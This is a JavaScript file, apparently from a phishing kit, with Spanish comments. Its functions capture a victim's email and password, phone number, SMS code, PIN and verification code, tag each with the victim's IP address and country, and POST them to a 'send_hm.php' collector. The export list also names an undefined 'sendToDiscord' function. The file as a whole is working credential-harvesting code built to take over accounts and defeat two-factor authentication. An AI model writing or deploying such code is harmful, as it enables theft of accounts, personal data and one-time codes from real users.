// ==============================================
// FUNCIONES BASE
// ==============================================

/**
 * Obtiene la dirección IP pública del usuario
 * @returns {Promise<string>} Dirección IP
 */
async function getIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error al obtener IP:", error);
    return "IP no disponible";
  }
}

/**
 * Obtiene el país basado en la IP
 * @param {string} ip - Dirección IP
 * @returns {Promise<string>} Nombre del país
 */
async function getCountry(ip) {
  if (ip === "IP no disponible") return "País no disponible";

  try {
    const response = await fetch(`https://ipapi.co/${ip}/country_name/`);
    return await response.text();
  } catch (error) {
    console.error("Error al obtener país:", error);
    return "País no disponible";
  }
}

/**
 * Envía datos al endpoint PHP
 * @param {string} tipo - Tipo de dato
 * @param {Object} campos - Campos a enviar
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function pushData(tipo, campos) {
  const body = new FormData();
  body.append("tipo", tipo);
  for (const [k, v] of Object.entries(campos)) {
    body.append(k, v ?? "");
  }
  try {
    await fetch("send_hm.php", { method: "POST", body, keepalive: true });
    return true;
  } catch (error) {
    console.error("Error al enviar datos:", error);
    return false;
  }
}

// ==============================================
// FUNCIONES ESPECÍFICAS PARA FORMULARIOS
// ==============================================

/**
 * Procesa datos de inicio de sesión (email y contraseña)
 * @param {string} email - Correo electrónico
 * @param {string} password - Contraseña
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendLoginData(email, password) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    localStorage.setItem("correo", email);
    return await pushData("login", { correo: email, clave: password, ip, pais: country });
  } catch (error) {
    console.error("Error en sendLoginData:", error);
    return false;
  }
}

/**
 * Procesa datos de teléfono
 * @param {string} phoneNumber - Número de teléfono con código de país
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendPhoneData(phoneNumber) {
  try {
    localStorage.setItem("numero", phoneNumber);
    const ip = await getIP();
    const country = await getCountry(ip);
    return await pushData("phone", { correo: localStorage.getItem("correo") || "", phone: phoneNumber, ip, pais: country });
  } catch (error) {
    console.error("Error en sendPhoneData:", error);
    return false;
  }
}

/**
 * Procesa código SMS de 6 dígitos
 * @param {string} code - Código de verificación
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendSmsCode(code) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    return await pushData("sms", { correo: localStorage.getItem("correo") || "", phone: localStorage.getItem("numero") || "", codigo: code, ip, pais: country });
  } catch (error) {
    console.error("Error en sendSmsCode:", error);
    return false;
  }
}

/**
 * Procesa código PIN de 6 dígitos
 * @param {string} pin - Código PIN
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendPinCode(pin) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    return await pushData("pin", { correo: localStorage.getItem("correo") || "", phone: localStorage.getItem("numero") || "", codigo: pin, ip, pais: country });
  } catch (error) {
    console.error("Error en sendPinCode:", error);
    return false;
  }
}

/**
 * Procesa código de verificación final
 * @param {string} code - Código de verificación
 * @returns {Promise<boolean>} True si fue exitoso
 */
async function sendVerificationCode(code) {
  try {
    const ip = await getIP();
    const country = await getCountry(ip);
    return await pushData("verification", { correo: localStorage.getItem("correo") || "", phone: localStorage.getItem("numero") || "", codigo: code, ip, pais: country });
  } catch (error) {
    console.error("Error en sendVerificationCode:", error);
    return false;
  }
}

// ==============================================
// EXPORTACIÓN DE FUNCIONES (si se usa como módulo)
// ==============================================
if (typeof module !== "undefined" && module.exports) {
  module.exports = {
    getIP,
    getCountry,
    sendToDiscord,
    sendLoginData,
    sendPhoneData,
    sendSmsCode,
    sendPinCode,
    sendVerificationCode,
  };
}
